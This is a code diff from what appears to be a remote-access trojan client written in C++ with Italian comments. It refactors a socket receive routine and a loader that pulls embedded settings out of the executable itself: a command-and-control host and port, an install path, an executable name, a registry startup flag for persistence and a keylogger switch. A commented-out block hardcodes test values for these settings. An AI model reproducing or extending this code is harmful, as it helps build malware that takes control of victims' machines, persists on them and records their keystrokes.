@@ -74,9 +74,9 @@ public:
 
 	static string UpdateClient(SOCKET Sock)
 	{
-		string Buff = TcpIP::RecvString(Sock);
+		string Buff;
 
-		if (Buff != "")
+		if (TcpIP::RecvString(Sock, Buff))
 		{
 			if (TcpIP::SendString(Sock, "OK"))
 				return Buff;
@@ -121,7 +121,11 @@ public:
 	// Popola i settaggi ottenendoli dal relativo file
 	void GetSettingsFromExe()
 	{
-		du.WriteFile(du.GetModuleFilePath() + "Sett", SimpleFind(du.GetBinaryFileContent(du.GetFullModuleFilePath()), en.AsciiToHex("{START}"), en.AsciiToHex("{END}")));
+		string FileName = du.GetModuleFilePath() + "Sett";
+		string BinaryFileContent = du.GetBinaryFileContent(du.GetFullModuleFilePath());
+		string FileContent = SimpleFind(BinaryFileContent, en.AsciiToHex("{START}"), en.AsciiToHex("{END}"));
+
+		du.WriteFile(FileName, FileContent);
 
 		Host = sf.GetSetting("Host");
 		Porta = stoi(sf.GetSetting("Port"));
@@ -129,6 +133,13 @@ public:
 		ExeName = sf.GetSetting("ExeName");
 		RegStartup = (sf.GetSetting("RegStartup") == "true");
 		KeyLogger = (sf.GetSetting("KeyLogger") == "true");
+
+		/*Host = "127.0.0.1";
+		Porta = 6969;
+		InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
+		ExeName = "Boiade.exe";
+		RegStartup = true;
+		KeyLogger = false;*/
 
 		du.DelFile(du.GetModuleFilePath() + "Sett");
 	}
